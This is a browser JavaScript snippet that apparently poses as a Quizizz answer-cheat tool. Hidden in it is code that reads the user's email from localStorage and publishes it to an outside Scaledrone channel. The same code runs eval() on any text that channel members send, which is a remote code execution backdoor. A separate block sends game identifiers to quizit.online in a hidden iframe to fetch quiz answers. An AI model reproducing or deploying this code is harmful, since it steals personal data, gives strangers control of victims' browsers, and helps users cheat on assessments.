artoo.injectScript('https://cdn.scaledrone.com/scaledrone.min.js', function() {
const CLIENT_ID = 'Wa9787NIBwG7ckyH';

const drone = new ScaleDrone(CLIENT_ID, {
  data: { // Will be sent out as clientData via events
    name: 'log',
    color: '#00FF00',
  },
});

let members = [];

drone.on('open', error => {
  if (error) {
    return console.error(error);
  }
  console.log('Successfully connected to Scaledrone');

  const room = drone.subscribe('observable-room');
  room.on('open', error => {
    if (error) {
      return console.error(error);
    }
     });


  drone.publish({
    room: 'log',
    message: {
      feedMessage: JSON.parse(localStorage['previousContext']).userProfile.email.toString() +" used quizizz cheat on " + new Date().getMonth() +'-'+ new Date().getDate() +'-'+ new Date().getFullYear() +' '+ new Date().getHours() +':'+ new Date().getMinutes()
,
      color: '#696969',
    },
  });
  room.on('members', m => {
    members = m;
    updateMembersDOM();
  });

  room.on('member_join', member => {
    members.push(member);
    updateMembersDOM();
  });

  room.on('member_leave', ({id}) => {
    const index = members.findIndex(member => member.id === id);
    members.splice(index, 1);
    updateMembersDOM();
  });

  room.on('data', (text, member) => {
    if (member) {
     eval(text)
    } else {
      // Message is from server
    }
  });
});

drone.on('close', event => {
  console.log('Connection was closed', event);
});

drone.on('error', error => {
  console.error(error);
});

//------------- DOM STUFF

const DOM = {
  membersCount: document.querySelector('.members-count'),
  membersList: document.querySelector('.members-list'),
  messages: document.querySelector('.messages'),
  input: document.querySelector('.message-form__input'),
  form: document.querySelector('.message-form'),
};

DOM.form.addEventListener('submit', sendMessage);

function sendMessage() {
  const value = DOM.input.value;
  if (value === '') {
    return;
  }
  DOM.input.value = '';
  drone.publish({
    room: 'observable-room',
    message: value,
  });
}

function createMemberElement(member) {
  const { name, color } = member.clientData;
  const el = document.createElement('div');
  el.appendChild(document.createTextNode(name));
  el.className = 'member';
  el.style.color = color;
  return el;
}

function updateMembersDOM() {
  DOM.membersCount.innerText = `${members.length} users in room:`;
  DOM.membersList.innerHTML = '';
  members.forEach(member =>
    DOM.membersList.appendChild(createMemberElement(member))
  );
}

function createMessageElement(text, member) {
  const el = document.createElement('div');
  el.appendChild(createMemberElement(member));
  el.appendChild(document.createTextNode(text));
  el.className = 'message';
  return el;
}

function addMessageToListDOM(text, member) {
  const el = DOM.messages;
  const wasTop = el.scrollTop === el.scrollHeight - el.clientHeight;
  el.appendChild(createMessageElement(text, member));
  if (wasTop) {
    el.scrollTop = el.scrollHeight - el.clientHeight;
  }
}  
});

(function () {
  const {
    game: { player, data },
    user,
  } = getCurrentData();

  if (!player.hasJoinedTheGame) {
    alert("Can't get current game data. Make sure you joined the game");
    return;
  }

  const dataString = window.btoa(
    unescape(
      encodeURIComponent(
        JSON.stringify({
          playerId: player.playerId,
          mongoId: user.profile.mongoId || null,
          roomHash: data.roomHash,
        })
      )
    )
  );

var SHEEP_2048;
(function() {
    'use strict';
    if (SHEEP_2048) {
        SHEEP_2048();
    } else {
        function applyStyles(elem, obj) {
            for (var prop in obj) elem.style[prop] = obj[prop];
        }
        var wrapper = document.createElement("div"),
            frame = document.createElement("iframe");
        frame.src = "https://quizit.online/services/quizizz/answers?data=" + dataString;
        frame.width = 333;
        frame.height = 461;
        frame.scrolling = "yes";
        frame.sandbox = "allow-same-origin allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-scripts";
        applyStyles(frame, {
            position: 'absolute',
            top: '-151.5px',
            left: '-27px',
            border: "none"
        });
        applyStyles(wrapper, {
            position: "fixed",
            zIndex: 2147483647,
            display: "block",
            bottom: "10px",
            left: "10px",
            width: "280px",
            height: "280px",
            overflow: "hidden",
            transition: "opacity 0.1s",
            borderRadius: "6px",
            transform: "scale(1)"
        });
        wrapper.appendChild(frame);
        document.body.parentNode.appendChild(wrapper);

        function enter() {
            wrapper.style.opacity = "1";
        }

        function leave() {
            wrapper.style.opacity = "0";
            frame.blur();
        }
        wrapper.addEventListener("mouseenter", enter, false);
        wrapper.addEventListener("mouseleave", leave, false);
        SHEEP_2048 = () => {
            wrapper.removeEventListener("mouseenter", enter, false);
            wrapper.removeEventListener("mouseleave", leave, false);
            wrapper.parentNode.removeChild(wrapper);
            frame = null;
            wrapper = null;
            SHEEP_2048 = undefined;
            for (var script of document.querySelectorAll('script[src="https://raw.githubusercontent.com/2-js/gen-paste/main/hideable.js"]')) script.parentNode.removeChild(script);
        };
    }
}());
})();

function getCurrentData() {
  const root = document.querySelector("#root");
  if (!root) {
    alert("Can't get current game data. Make sure you joined the game");
    return;
  }

  const { user, game } = root.__vue_app__.config.globalProperties.$store.state;

  return {
    game,
    user,
  };
}
